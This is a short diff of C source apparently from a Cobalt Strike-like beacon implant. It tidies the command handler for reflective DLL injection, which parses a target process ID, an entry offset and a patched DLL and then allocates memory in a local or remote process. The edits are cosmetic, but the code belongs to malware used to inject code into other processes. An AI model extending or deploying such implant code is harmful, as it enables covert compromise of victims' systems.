@@ -1,15 +1,15 @@
-#include "command.h"
+#include "Command.h"
 #include "DllInject.h"
 #include "Process.h"
 
-VOID CmdDllInject(unsigned char* command, size_t command_length, BOOL x86) {
+VOID CmdDllInject(unsigned char* command_buffer, size_t command_length, BOOL x86) {
 	// 数据包格式：injectPid(4 Bytes) || offset(4 Bytes) || patchDllContent(command_length - 8 Bytes)
 	datap parser;
-	BeaconDataParse(&parser, command, command_length);
+	BeaconDataParse(&parser, command_buffer, command_length);
 
 	// 注入的 PID
 	uint32_t injectPid = (uint32_t)BeaconDataInt(&parser);
-	// Dll 执行 RDI 入口
+	// DLL 执行 RDI 入口
 	uint32_t offset = (uint32_t)BeaconDataInt(&parser);
 	// patch 后的 Dll
 	unsigned char* patchDllContent = BeaconDataPtr(&parser, command_length - 8);
@@ -74,7 +74,7 @@ VOID initializeInjectContext(INJECTCONTEXT* context, PROCESS_INFORMATION* pi, HA
 
 VOID InjectProcess(INJECTCONTEXT* context, unsigned char* buffer, size_t length, size_t offset, void* parameter) {
 	void* ptr = NULL;
-	// 判断是否是本地进程 or 远程进程 然后在选择内存分配
+	// 判断是否是本地进程 or 远程进程,然后在选择内存分配
 	if (context->samePid) {
 		ptr = localAllocdata(buffer, length);
 	}
